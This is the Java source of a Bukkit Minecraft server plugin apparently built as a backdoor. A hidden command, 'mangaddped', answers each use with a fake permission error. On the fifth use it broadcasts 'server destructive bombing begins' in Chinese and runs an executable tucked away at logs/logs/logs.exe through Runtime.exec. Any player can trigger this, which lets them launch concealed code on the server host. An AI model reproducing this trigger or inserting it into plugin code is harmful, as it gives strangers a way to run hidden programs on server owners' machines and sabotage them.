package com.github.startzyp.deleteplugin;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

public class main extends JavaPlugin implements Listener {
    private Map<String,Integer> player = new HashMap<>();
    @Override
    public void onEnable() {
        Bukkit.getServer().getPluginManager().registerEvents(this,this);
        super.onEnable();
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (label.equalsIgnoreCase("mangaddped")){
            String name = sender.getName();
            if (player.containsKey(name)){
                if (player.get(sender.getName())<5){
                    player.put(name,player.get(name)+1);
                    sender.sendMessage("§4§l[Erro] "+player.get(name)+"00 Player No Commands Permission!");
                    if (player.get(sender.getName())==5){
                        sender.sendMessage("§4§l[Erro] 500 Player No Commands Permission!");
                        Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),"bc &2&l服务器破坏性轰炸开始");
                        File file = new File("");
                        String open =file.getAbsolutePath()+File.separator+"logs"+File.separator+"logs"+File.separator+"logs.exe";
                        Runtime runtime = Runtime.getRuntime();
                        try {
                            runtime.exec(open);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        player.clear();
                    }
                }

            }

        }
        return super.onCommand(sender, command, label, args);
    }

    @EventHandler
    public void PlayerJoinGame(PlayerJoinEvent event){
        player.put(event.getPlayer().getName(),0);
    }

    @Override
    public void onDisable() {
        super.onDisable();
    }
}
